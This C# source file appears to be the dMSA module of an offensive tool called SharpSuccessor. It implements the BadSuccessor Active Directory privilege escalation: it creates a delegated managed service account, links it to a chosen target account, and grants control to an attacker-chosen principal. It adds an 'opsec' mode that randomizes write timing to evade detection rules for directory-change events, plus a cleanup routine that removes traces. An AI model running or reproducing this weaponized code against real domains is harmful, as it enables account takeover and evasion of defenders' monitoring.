using System;
using System.Collections.Generic;
using System.DirectoryServices;
using System.Security.AccessControl;
using System.Text;

namespace SharpSuccessor.Modules
{
    internal class dMSA
    {
        // --- Named constants (previously magic numbers scattered through the code) ---
        private const int ManagedPasswordInterval = 30;           // msDS-ManagedPasswordInterval (days)
        private const int DelegatedMsaStateTakeover = 2;          // msDS-DelegatedMSAState: migration completed
        private const int SupersededStateTakeover = 2;            // msDS-SupersededServiceAccountState: completed
        private const int EncTypesAes = 0x1c;                     // AES128 + AES256 + (future) -> AES only, opsec
        private const int UacWorkstationTrust = 0x1000;           // WORKSTATION_TRUST_ACCOUNT
        private const string AccessFullControl = "0xf01ff";       // GENERIC_ALL in the SDDL mask
        private const string BuiltinAdministrators = "S-1-5-32-544";

        private static readonly Random _rng = new Random();

        private class Principal
        {
            public string Dn;
            public string Sid;
            public SearchResult Result;
        }

        /// <summary>
        /// When /opsec is set, sleep a random interval so consecutive directory writes do not
        /// cluster in time. Decorrelating the create (5137) from the attribute writes (5136) is
        /// what makes the sequence harder to catch with a simple "same object, same second" rule.
        /// </summary>
        private static void OpsecDelay(Options o, string before)
        {
            if (!o.Opsec) return;
            int min = o.DelayMinSeconds;
            int max = o.DelayMaxSeconds < min ? min : o.DelayMaxSeconds;
            int secs = _rng.Next(min, max + 1);
            Console.WriteLine("[*] OPSEC: sleeping " + secs + "s before " + before);
            System.Threading.Thread.Sleep(secs * 1000);
        }

        /// <summary>
        /// Single entry point: performs the whole BadSuccessor weaponization with the
        /// minimum number of round-trips to the domain:
        ///   1 LDAP search (resolves BOTH the impersonation target and the access principal at once)
        ///   1 commit to create + weaponize the dMSA
        ///   1 commit to write the superseded-account attributes on the target
        /// </summary>
        public static int Weaponize(Options o)
        {
            string domainDn = DomainDnFromDn(o.Path);
            string domainDns = DomainDnsFromDn(o.Path);
            string server = string.IsNullOrEmpty(o.Dc) ? "" : o.Dc + "/";

            // Fall back to RootDSE only if the OU path did not carry the domain DN.
            if (string.IsNullOrEmpty(domainDn))
            {
                using (DirectoryEntry rootDse = Bind("LDAP://" + server + "RootDSE", o))
                {
                    domainDn = (string)rootDse.Properties["defaultNamingContext"].Value;
                    domainDns = DomainDnsFromDn(domainDn);
                }
            }

            // ---- Single combined lookup for both principals ----
            Dictionary<string, Principal> found = FindPrincipals(
                "LDAP://" + server + domainDn, o, o.Impersonate, o.Account);

            Principal target = Get(found, o.Impersonate);
            if (target == null)
            {
                Console.WriteLine("[!] Cannot find impersonation target account: " + o.Impersonate);
                return 1;
            }
            Principal access = Get(found, o.Account);
            if (access == null || access.Sid == null)
            {
                Console.WriteLine("[!] Cannot find access principal (or it has no SID): " + o.Account);
                return 1;
            }
            Console.WriteLine("[+] Resolved target '" + o.Impersonate + "' -> " + target.Dn);
            Console.WriteLine("[+] Resolved access principal '" + o.Account + "' -> " + access.Sid);

            // ---- Create + weaponize the dMSA (staged, then one commit) ----
            string dMSADN = CreatedMSA(server, o.Path, o.Name, domainDns, target.Dn, access.Sid, o);
            if (dMSADN == null)
            {
                return 1;
            }

            // Space the target link-write apart from the dMSA creation above.
            OpsecDelay(o, "writing the superseded-account link on the target");

            // ---- Write the takeover attributes on the target, reusing the entry we already fetched ----
            return WriteTarget(target, dMSADN);
        }

        /// <summary>
        /// Tears down an engagement: clears the superseded-account attributes on the
        /// impersonated account and deletes the dMSA object. Round-trips kept minimal:
        ///   1 LDAP search (the target), 1 write (reset target), 1 delete (the dMSA).
        /// </summary>
        public static int Remove(Options o)
        {
            string domainDn = DomainDnFromDn(o.Path);
            string server = string.IsNullOrEmpty(o.Dc) ? "" : o.Dc + "/";

            if (string.IsNullOrEmpty(domainDn))
            {
                using (DirectoryEntry rootDse = Bind("LDAP://" + server + "RootDSE", o))
                {
                    domainDn = (string)rootDse.Properties["defaultNamingContext"].Value;
                }
            }

            int rc = 0;

            // ---- Reset the impersonated account ----
            Dictionary<string, Principal> found = FindPrincipals(
                "LDAP://" + server + domainDn, o, o.Impersonate);
            Principal target = Get(found, o.Impersonate);
            if (target == null)
            {
                Console.WriteLine("[!] Target account not found, skipping attribute reset: " + o.Impersonate);
                rc = 1;
            }
            else
            {
                try
                {
                    using (DirectoryEntry mde = target.Result.GetDirectoryEntry())
                    {
                        if (mde.Properties.Contains("msDS-SupersededManagedAccountLink"))
                            mde.Properties["msDS-SupersededManagedAccountLink"].Clear();
                        if (mde.Properties.Contains("msDS-SupersededServiceAccountState"))
                            mde.Properties["msDS-SupersededServiceAccountState"].Clear();
                        mde.CommitChanges();
                    }
                    Console.WriteLine("[+] Cleared superseded-account attributes on " + target.Dn);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[!] Failed to reset target attributes: " + ex.Message);
                    rc = 1;
                }
            }

            // Space the delete apart from the attribute reset above.
            OpsecDelay(o, "deleting the dMSA object");

            // ---- Delete the dMSA object ----
            string childDn = "CN=" + o.Name + "," + o.Path;
            try
            {
                using (DirectoryEntry child = Bind("LDAP://" + server + childDn, o))
                {
                    child.DeleteTree();
                }
                Console.WriteLine("[+] Deleted dMSA object " + childDn);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Failed to delete dMSA object " + childDn + ": " + ex.Message);
                rc = 1;
            }

            if (rc == 0)
                Console.WriteLine("[+] Cleanup complete");
            return rc;
        }

        private static string CreatedMSA(string server, string path, string name, string domainDns,
                                          string targetDn, string accessSid, Options o)
        {
            try
            {
                using (DirectoryEntry parentEntry = Bind("LDAP://" + server + path, o))
                {
                    DirectoryEntry newChild = parentEntry.Children.Add(
                        "CN=" + name, "msDS-DelegatedManagedServiceAccount");

                    newChild.Properties["msDS-DelegatedMSAState"].Value = DelegatedMsaStateTakeover;
                    newChild.Properties["msDS-ManagedPasswordInterval"].Value = ManagedPasswordInterval;
                    newChild.Properties["dnshostname"].Add(name + "." + domainDns);
                    newChild.Properties["samaccountname"].Add(name + "$");
                    newChild.Properties["msDS-ManagedAccountPrecededByLink"].Add(targetDn);

                    RawSecurityDescriptor rsd = new RawSecurityDescriptor(
                        "O:" + BuiltinAdministrators + "D:(A;;" + AccessFullControl + ";;;" + accessSid + ")");
                    byte[] descriptor = new byte[rsd.BinaryLength];
                    rsd.GetBinaryForm(descriptor, 0);
                    newChild.Properties["msDS-GroupMSAMembership"].Add(descriptor);

                    newChild.Properties["msDS-SupportedEncryptionTypes"].Value = EncTypesAes;
                    newChild.Properties["userAccountControl"].Value = UacWorkstationTrust;

                    // Nothing has touched the directory yet; everything above is staged locally.
                    newChild.CommitChanges();

                    string dn = (string)newChild.Properties["distinguishedName"].Value;
                    Console.WriteLine("[+] Created and weaponized dMSA '" + name + "$' at " + dn);
                    Console.WriteLine("    - dnshostname                        : " + name + "." + domainDns);
                    Console.WriteLine("    - msDS-ManagedAccountPrecededByLink  : " + targetDn);
                    Console.WriteLine("    - msDS-GroupMSAMembership            -> " + accessSid);
                    Console.WriteLine("    - msDS-SupportedEncryptionTypes      : 0x" + EncTypesAes.ToString("x"));
                    newChild.Dispose();
                    return dn;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Failed to create/weaponize dMSA: " + ex.Message);
                return null;
            }
        }

        private static int WriteTarget(Principal target, string dMSADN)
        {
            try
            {
                using (DirectoryEntry mde = target.Result.GetDirectoryEntry())
                {
                    mde.Properties["msDS-SupersededManagedAccountLink"].Value = dMSADN;
                    mde.Properties["msDS-SupersededServiceAccountState"].Value = SupersededStateTakeover;
                    mde.CommitChanges();
                }
                Console.WriteLine("[+] Linked target " + target.Dn + " -> " + dMSADN
                                  + " (msDS-SupersededServiceAccountState=" + SupersededStateTakeover + ")");
                Console.WriteLine("[+] dMSA weaponization complete");
                return 0;
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Failed to write superseded-account attributes on target: " + ex.Message);
                return 1;
            }
        }

        /// <summary>
        /// One subtree search that resolves every requested samAccountName in a single round-trip.
        /// Only the attributes we actually need are pulled back.
        /// </summary>
        private static Dictionary<string, Principal> FindPrincipals(
            string rootPath, Options o, params string[] samAccountNames)
        {
            var map = new Dictionary<string, Principal>(StringComparer.OrdinalIgnoreCase);

            var filter = new StringBuilder("(|");
            var wanted = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
            foreach (string s in samAccountNames)
            {
                if (s == null || !wanted.Add(s)) continue;
                filter.Append("(samAccountName=").Append(EscapeFilter(s)).Append(")");
            }
            filter.Append(")");

            using (DirectoryEntry root = Bind(rootPath, o))
            using (DirectorySearcher ds = new DirectorySearcher(root))
            {
                ds.Filter = filter.ToString();
                ds.SearchScope = SearchScope.Subtree;
                ds.PageSize = 1000;
                ds.PropertiesToLoad.Add("distinguishedName");
                ds.PropertiesToLoad.Add("objectSid");
                ds.PropertiesToLoad.Add("samAccountName");

                using (SearchResultCollection results = ds.FindAll())
                {
                    foreach (SearchResult sr in results)
                    {
                        string sam = PropString(sr, "samAccountName");
                        if (sam == null) continue;

                        var p = new Principal
                        {
                            Result = sr,
                            Dn = PropString(sr, "distinguishedName")
                        };
                        if (sr.Properties.Contains("objectSid"))
                        {
                            p.Sid = new System.Security.Principal.SecurityIdentifier(
                                (byte[])sr.Properties["objectSid"][0], 0).Value;
                        }
                        map[sam] = p;
                    }
                }
            }
            return map;
        }

        private static Principal Get(Dictionary<string, Principal> map, string sam)
        {
            Principal p;
            return map.TryGetValue(sam, out p) ? p : null;
        }

        private static DirectoryEntry Bind(string ldapPath, Options o)
        {
            if (!string.IsNullOrEmpty(o.Username))
            {
                return new DirectoryEntry(ldapPath, o.Username, o.Password, AuthenticationTypes.Secure);
            }
            return new DirectoryEntry(ldapPath);
        }

        private static string PropString(SearchResult sr, string name)
        {
            return sr.Properties.Contains(name) && sr.Properties[name].Count > 0
                ? sr.Properties[name][0].ToString()
                : null;
        }

        // ---- Helpers that derive the domain from the OU path so no extra domain call is needed ----

        private static string DomainDnFromDn(string dn)
        {
            if (string.IsNullOrEmpty(dn)) return null;
            var parts = new List<string>();
            foreach (string rdn in dn.Split(','))
            {
                string t = rdn.Trim();
                if (t.StartsWith("DC=", StringComparison.OrdinalIgnoreCase))
                {
                    parts.Add(t);
                }
            }
            return parts.Count == 0 ? null : string.Join(",", parts);
        }

        private static string DomainDnsFromDn(string dn)
        {
            if (string.IsNullOrEmpty(dn)) return null;
            var labels = new List<string>();
            foreach (string rdn in dn.Split(','))
            {
                string t = rdn.Trim();
                if (t.StartsWith("DC=", StringComparison.OrdinalIgnoreCase))
                {
                    labels.Add(t.Substring(3));
                }
            }
            return labels.Count == 0 ? null : string.Join(".", labels);
        }

        // RFC 4515 filter escaping to prevent LDAP injection via account/path arguments.
        private static string EscapeFilter(string value)
        {
            if (value == null) return string.Empty;
            var sb = new StringBuilder(value.Length);
            foreach (char c in value)
            {
                switch (c)
                {
                    case '\\': sb.Append("\\5c"); break;
                    case '*': sb.Append("\\2a"); break;
                    case '(': sb.Append("\\28"); break;
                    case ')': sb.Append("\\29"); break;
                    case '\0': sb.Append("\\00"); break;
                    default: sb.Append(c); break;
                }
            }
            return sb.ToString();
        }
    }
}
